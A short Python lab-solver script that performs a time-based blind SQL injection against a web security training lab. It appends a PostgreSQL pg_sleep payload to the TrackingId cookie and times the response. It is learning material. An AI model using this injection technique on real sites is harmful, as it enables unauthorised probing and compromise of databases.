import requests
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.tracking_id = None

    def initiate_first_request(self):
        self.session.get(self.lab_url)
        self.tracking_id = list(self.session.cookies.items())[0][1]

    def send_request_with_delaying(self):
        payload = '\'%3b SELECT pg_sleep(10)--'
        self.session.cookies.set('TrackingId', self.tracking_id + payload)
        response = self.session.get(self.lab_url)
        print(response.elapsed)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.initiate_first_request()
        self.send_request_with_delaying()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
